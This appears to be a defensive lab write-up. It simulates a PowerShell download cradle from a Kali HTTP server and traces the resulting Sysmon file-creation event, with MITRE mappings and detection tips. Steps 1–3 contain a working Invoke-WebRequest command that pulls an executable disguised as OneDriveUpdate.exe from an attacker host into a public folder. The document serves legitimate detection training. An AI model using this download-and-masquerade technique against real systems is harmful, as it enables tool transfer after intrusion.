# Lab 04 – PowerShell Download Cradle Detection

## Objective

Simulate a threat actor downloading a payload from a remote server using PowerShell and investigate the activity using Sysmon.

---

## Attack Overview

One of the most common techniques used by attackers is to use PowerShell to download additional tools after gaining initial access.

Instead of placing malware directly on the victim system, the attacker hosts the payload on a remote server and downloads it only when needed.

This technique is commonly observed in malware loaders, ransomware campaigns, and post-exploitation frameworks.

---

## MITRE ATT&CK Mapping

| Technique             | ID        |
| --------------------- | --------- |
| PowerShell            | T1059.001 |
| Ingress Tool Transfer | T1105     |
| Masquerading          | T1036     |

---

# Lab Environment

## Attacker

* Kali Linux
* Python HTTP Server
* IP Address: `192.168.199.131`

## Victim

* Windows 10
* Sysmon
* Wazuh Agent

---

# Attack Simulation

## Step 1 – Create Payload

On Kali:

```bash
mkdir ~/payloads
cp /bin/ls ~/payloads/OneDriveUpdate.exe
```

---

## Step 2 – Start HTTP Server

```bash
cd ~/payloads
python3 -m http.server 8080
```

The payload becomes available at:

```text
http://192.168.199.131:8080/OneDriveUpdate.exe
```

---

## Step 3 – Download Payload

On Windows:

```powershell
Invoke-WebRequest -Uri "http://192.168.199.131:8080/OneDriveUpdate.exe" -OutFile "C:\Users\Public\OneDriveUpdate.exe"
```

---

# Investigation

## Verify Download

```powershell
dir C:\Users\Public\OneDriveUpdate.exe
```

Expected result:

```text
OneDriveUpdate.exe
```

---

## Sysmon Evidence

### Event ID

```text
11 - File Create
```

Evidence observed:

```text
Image:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename:
C:\Users\Public\OneDriveUpdate.exe
```

This confirms that PowerShell created the downloaded executable.

---

# Detection Opportunities

A SOC analyst should investigate:

* PowerShell downloading files from remote hosts.
* Executables written to public or temporary directories.
* Masqueraded filenames such as `OneDriveUpdate.exe`.
* File creation immediately following PowerShell activity.

---

# Why This Activity Is Suspicious

Legitimate PowerShell usage rarely downloads executable files directly into public folders.

Attackers commonly abuse `Invoke-WebRequest` to retrieve additional payloads from attacker-controlled infrastructure before executing them.

---

# Screenshots

### Attack Execution

![attack execution](Screenshots/attack_execution.jpg)

### Download Verification

![downloaded File](Screenshots/downloaded_file.jpg)

### Sysmon File Creation Event

![sysmon Event](Screenshots/sysmon_file_creation.jpg)

### HTTP Request on Kali

![kali HTTP Server](Screenshots/kali_http_request.jpg)

---

# Outcome

Successfully simulated a PowerShell Download Cradle attack.

The payload was hosted on a remote HTTP server, downloaded using PowerShell, and recorded by Sysmon as a file creation event. This demonstrates how attackers transfer tools to compromised systems using native Windows utilities and how defenders can investigate the resulting telemetry.
